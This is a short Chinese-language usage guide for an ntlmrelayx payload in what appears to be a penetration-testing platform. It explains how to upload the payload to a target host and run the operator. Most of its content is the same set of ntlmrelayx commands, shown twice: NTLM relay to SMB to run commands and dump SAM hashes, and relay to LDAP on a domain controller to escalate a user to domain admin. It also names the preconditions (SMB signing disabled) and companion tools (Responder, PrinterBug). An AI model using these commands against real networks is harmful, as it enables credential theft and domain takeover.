## 📦 载荷使用说明：ntlmrelayx.sh

该载荷文件主要配合 **ntlmrelayx** 算子（攻击技法）使用。以下是详细的操作步骤和参数说明。

### 📝 操作步骤

1. **准备阶段**：将本载荷文件通过系统的文件管理功能或光盘摆渡方式上传至目标虚拟机或宿主机指定目录。
2. **执行阶段**：在目标环境中调用 `ntlmrelayx` 算子，并指定本载荷文件作为配置或脚本输入。
3. **结果验证**：观察执行日志，确认算子执行成功，并根据返回结果进行下一步渗透测试策略的制定。

### ⚙️ 参数说明

以下是本载荷涉及的核心参数及其含义（请根据实际隔离网络环境进行修改）：

**配置示例 1**：
```bash
# 中继到目标执行命令
python3 ntlmrelayx.py -t smb://192.168.1.60 -c "whoami"

# 转储 SAM
python3 ntlmrelayx.py -t smb://192.168.1.60 --no-http-server
```

**配置示例 2**：
```bash
python3 ntlmrelayx.py -t ldap://DC01 --escalate-user user
```

### 📖 原始工具说明

以下是系统内置的原始工具说明，供参考：

## ntlmrelayx NTLM中继攻击

### SMB 中继
```bash
# 中继到目标执行命令
python3 ntlmrelayx.py -t smb://192.168.1.60 -c "whoami"

# 转储 SAM
python3 ntlmrelayx.py -t smb://192.168.1.60 --no-http-server
```

### LDAP 中继 (创建域管)
```bash
python3 ntlmrelayx.py -t ldap://DC01 --escalate-user user
```

- ⚠ 需要目标 SMB 签名未启用
- 配合 Responder 或 PrinterBug 使用